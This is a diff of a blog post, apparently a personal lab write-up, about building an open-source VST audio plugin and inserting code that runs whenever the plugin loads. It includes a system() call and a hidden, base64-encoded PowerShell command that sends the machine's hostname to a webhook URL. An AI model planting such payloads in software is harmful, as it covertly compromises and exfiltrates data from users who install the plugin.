@@ -18,11 +18,13 @@ A nice easy one tldr on what a VST is: “A VST plugin is a software module for 
 
 Yes, if you are living in dreamland where the mountains are made of chocolate and the sales people get engagements with enough time on them. 
 
+![chocolateland](/assets/images/vst/chocolate.jpg)
+
 This project, that should have taken me about ten minutes from end to end, has been pushed back for WEEKS because of these unhelpful GitHub instructions. This has infact made me go back and amend my [C.A.P.S.U.L.E.S. instructions](https://onecloudemoji.github.io/labbing/projects/learning/capsules/), simply because these were so dogshit I wasted literal portions of my life.
 
 Much, MUCH is missing from these instructions, holy shit. The following tool chain is required to even begin getting this built and is absolutely not mentioned anywhere in the repo.
 
-apt-get install build-essential cmake git libx11-dev libxrandr-dev libxinerama-dev libxcursor-dev libxi-dev libgl1-mesa-dev libglu1-mesa-dev libfreetype6-dev pkg-config libxcb-util-dev libxcb-cursor-dev libxcb-keysyms1-dev libxcb-xkb-dev libxkbcommon-dev libxkbcommon-x11-dev libcairo2-dev libpango1.0-dev libgtkmm-3.0-dev libsqlite3-dev
+````apt-get install build-essential cmake git libx11-dev libxrandr-dev libxinerama-dev libxcursor-dev libxi-dev libgl1-mesa-dev libglu1-mesa-dev libfreetype6-dev pkg-config libxcb-util-dev libxcb-cursor-dev libxcb-keysyms1-dev libxcb-xkb-dev libxkbcommon-dev libxkbcommon-x11-dev libcairo2-dev libpango1.0-dev libgtkmm-3.0-dev libsqlite3-dev````
 
 We build, and we wait. My goodness, this takes an enormous amount of time to compile. Oh would you look at that, the vague instructions did not say that those are the commands to compile it ON windows, I assumed these were the instructions to compile it FOR windows, excellent thank you for my error at 94% of the compilation!
 
@@ -34,14 +36,14 @@ Fantastic, where’s the code execution? Well here’s the thing, this is just a
 
 onto the real star of the show, is inserting 
 
-#include <cstdlib>
-system("calc.exe");
+````#include <cstdlib>````
+````system("calc.exe");````
 	
 where the plugin gets created. 
 
 Thats it you say? I sat through this nonsense to read about you inserting a call to system? Remember this blog isn’t for you, it is for me. And it is interesting the ways that you can get fucked even by little technologies you don’t even think have the capacity to handle baked in malware. Here is it pushing the response to hostname out to a webhook. Not terribly exciting, but it took 6 seconds to insert and now every single time open this vst, the call is made. Because this is simply code, that does not mess with the inner workings of the plugin, it (the plugin) continues to function without any issue. 
 
-"cmd /c start /min powershell -WindowStyle Hidden -encodedcommand JABoAG8AcwB0AG4AYQBtAGUAIAA9ACAAJABlAG4AdgA6AEMATwBNAFAAVQBUAEUAUgBOAEEATQBFADsAIAAkAHUAcgBpACAAPQAgACIAaAB0AHQAcABzADoALwAvAHcAZQBiAGgAbwBvAGsALgBzAGkAdABlAC8AYgA1AGYAZAA0AGIANQBhAC0AZQAzADUAMgAtADQAZgAyADYALQA5AGYANwBmAC0AYQA3AGMAZgA1AGYANQA5ADEANQBhADIAIgA7ACAAJABiAG8AZAB5ACAAPQAgAEAAewAgAGgAbwBzAHQAbgBhAG0AZQAgAD0AIAAkAGgAbwBzAHQAbgBhAG0AZQAgAH0AIAB8ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBKAHMAbwBuADsAIABJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcgBpACAAJAB1AHIAaQAgAC0ATQBlAHQAaABvAGQAIABQAG8AcwB0ACAALQBCAG8AZAB5ACAAJABiAG8AZAB5ACAALQBDAG8AbgB0AGUAbgB0AFQAeQBwAGUAIAAiAGEAcABwAGwAaQBjAGEAdABpAG8AbgAvAGoAcwBvAG4AIgAKAA==");
+````"cmd /c start /min powershell -WindowStyle Hidden -encodedcommand JABoAG8AcwB0AG4AYQBtAGUAIAA9ACAAJABlAG4AdgA6AEMATwBNAFAAVQBUAEUAUgBOAEEATQBFADsAIAAkAHUAcgBpACAAPQAgACIAaAB0AHQAcABzADoALwAvAHcAZQBiAGgAbwBvAGsALgBzAGkAdABlAC8AYgA1AGYAZAA0AGIANQBhAC0AZQAzADUAMgAtADQAZgAyADYALQA5AGYANwBmAC0AYQA3AGMAZgA1AGYANQA5ADEANQBhADIAIgA7ACAAJABiAG8AZAB5ACAAPQAgAEAAewAgAGgAbwBzAHQAbgBhAG0AZQAgAD0AIAAkAGgAbwBzAHQAbgBhAG0AZQAgAH0AIAB8ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBKAHMAbwBuADsAIABJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcgBpACAAJAB1AHIAaQAgAC0ATQBlAHQAaABvAGQAIABQAG8AcwB0ACAALQBCAG8AZAB5ACAAJABiAG8AZAB5ACAALQBDAG8AbgB0AGUAbgB0AFQAeQBwAGUAIAAiAGEAcABwAGwAaQBjAGEAdABpAG8AbgAvAGoAcwBvAG4AIgAKAA==");````
 
 What’s going on here is this is an interesting test bed for me to try some interesting vectors in the future, beyond just chucking some c# into msbuild and csc. For funsies I shall in a future instalment implement some shellcode runners in cpp, but the pressing need is not there right now since its really got no applicability to work or any thing other project. 
 
